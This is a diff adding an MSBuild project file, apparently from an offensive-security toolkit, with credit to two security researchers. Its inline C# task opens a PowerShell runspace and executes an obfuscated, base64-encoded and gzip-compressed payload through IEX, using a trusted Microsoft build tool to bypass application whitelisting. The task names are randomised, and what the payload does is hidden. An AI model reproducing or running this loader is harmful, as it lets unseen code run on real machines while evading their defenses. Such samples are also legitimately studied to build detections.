@@ -1,0 +1,44 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+ <!-- Author: Pierre-Alexandre Braeken, Twitter: @pabraeken -->
+ <!-- Based on Casey Smith work (https://gist.github.com/subTee/ca477b4d19c885bec05ce238cbad6371), Twitter: @subTee  -->
+  <Target Name="34rfas">
+   <QWEridxnaPO />
+  </Target>
+	<UsingTask
+    TaskName="QWEridxnaPO"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	<Task>
+	  <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs">
+        <![CDATA[		
+			using System;
+			using System.IO;
+			using System.Diagnostics;
+			using System.Reflection;
+			using System.Runtime.InteropServices;
+			using System.Collections.ObjectModel;
+			using System.Management.Automation;
+			using System.Management.Automation.Runspaces;
+			using System.Text;
+			using Microsoft.Build.Framework;
+			using Microsoft.Build.Utilities;							
+			public class QWEridxnaPO :  Task, ITask {
+				public override bool Execute() {
+					string pok = "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sIAAAAAAAA/7VX+3PaRhD+ufwVO5g20CLFNnFmkpa2fqV1xw8muI8p0MwhLXCxdMfoTsbEcf727p1OQsKQJu1Uk3Hutbvffrt7e3y3U/P7SyHniqsaAFxIwbVMFFylOpLyBiYyAQZqjgGf8AAwZjxqAxMhLGYogGtgScJvUbVBaZZoRafnbBlJFvo1/+S0f/z6rHd9dnVptPfT5BaXCvQMIVVYMsPm84gHTHMpgJFOSHCaRiwBLjQmt4xscgHISTKx4lyM5R0QuLepMCijEJO2Q6sTPp3SuRJYbcA6gEbcOYThCizhe2XERSYHWhaKjIQ7ZzyOU6UhkEIzwqRnCeKKoBtcLmQSKh/geoZLCDFiy8ILCEg9i5SEMUJAamTM36Fh6vSPw4ve+alBcYkL72QpWMwDR8+1w+G5gbUAwXJMPp9zcYPhmWhbG6g0+eTlYI9fDn/nIpQLNVRL2oo7+8NYsYD+9/EOwcvgdXZrxvD1jCtY8CgChdo6XRAgIc4yo4jdE+ViYDkXS8eao4WLqT1ZRgoFVBuSEl5LI8JYhss2AdAzCmJnl1CQttBROEa9QApisAwiVDZcVyLACswMAjkRosaANLdNuKxHm0JZYsKv7Xxfm6QisBm4NQK1e2MXBsdxGKE+ImrJ0WZrZFd7LGGxHTXtX/PtmCwAvGOBLiAsZjyYlZPR4SmEBlYTuZA0L4gpRrQvuw2dpOgs2UO/sYjTHh7LVOhmp90pbyoyJqaD0ahRTpl2bQ2Y5jGa4C4Y8ZQzbEg0gVU0m6vPQ9U4McF6ZGeSUgjmjAJLxiLpCp3+hVzdgJz8exoavUyqYrKPeZkHCZ/rLelbuTmkuVkWXGG7dL1QJjk5/CdYE6rqSngU5XEwGzV+ISt2tZUhPMIpF3Z0X0J8ghMusGS6SViNaMvWCrGKplDOqISVw6wqpJvtV3YdutAptvikaRG0ipWVVSsqo0zqMo3HVnZ/JfxQjJCc+2QNz9cUZH97iQxQqTXPqRYibGZB3WKgQk7eLy4pAmrOAlzD4ra7IKiE5fgt3QLgBTIGt+OXGs23VVmhSCzX4P+E2tjoGxvN+sVh76zeqgosEq7Ru8VkLBVCvW/q2Vx7RfkgS4JZfc2Xvl21voSoOCWWC+em3mVjT7dTkOo1R4tQE2yDlShiaaSz5eZaTFpV2VOj2jqbHfK5yaqNZ94bVMgIcDUm5jOp9cY/ojsbvJhRrkPlrhnsjsAz+D96aO9TDu2PWo+sP8aT85td4XIyKXpKfsFQhKZYYpZ8I3OmRRjuY/IUcEJNnKPQLnwU0I2GMoIs5G4OfvNBd4YS1+vbSxm8MzFP9VWWnCtFm8UzjKb2u06XpyiDNTyBJ1spKFLMdGNyRrnk+vX1ee44zURWsK75zmWiIWFiipuBkOxrnOId4agPPOa9O/T+3PVe/PjyS//N8JsPO93R/X57/+D5w9Af0K6Z0XjcrJ6lo/6HnR++evq0O/q6Vd9sqkdQClt/NQckOrrfaz97eD/Y8w5G2Zxmz2n0zE07ND0ozffN3CzsZwtm1qHRwajV2GzWZXqzoVwKETEr+h9noPk2Z2HOV56LFLl8+J6iE9HYUy4XekZ7Ilb8btVo6q2k1KMbsSGor25G9nF0BUKbSt0K2jy/6pvzqyyeSxoBqtKt5x+202RirVY8qXWe+us8FcnxUaLKav87U0abQVfS+pm+bmdg/dt40DYXz7VQ8LI3PfzMw5Dea438PesdJtM0pno/5/QDpQ4NFLcv5+mYGt7wnI8TxlHR83+c8ih8Q+9PumD9uziq174wH95x/ch4FXd1loFSEb0S3btv1fih1PlPRVjq+g+1h9r/8wvnggeJVHKi/cvT6+Er80gjNTfD22f+rt/Z7ey9GF70j4zz1d8+fwOFCLHVBA8AAA==')); IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();"
+					Runspace runspace = RunspaceFactory.CreateRunspace();
+					runspace.Open();
+					RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
+					Pipeline pipeline = runspace.CreatePipeline();
+					pipeline.Commands.AddScript(pok);
+					pipeline.Invoke();
+					runspace.Close();			
+					return true;
+				}								 
+			}			
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
+
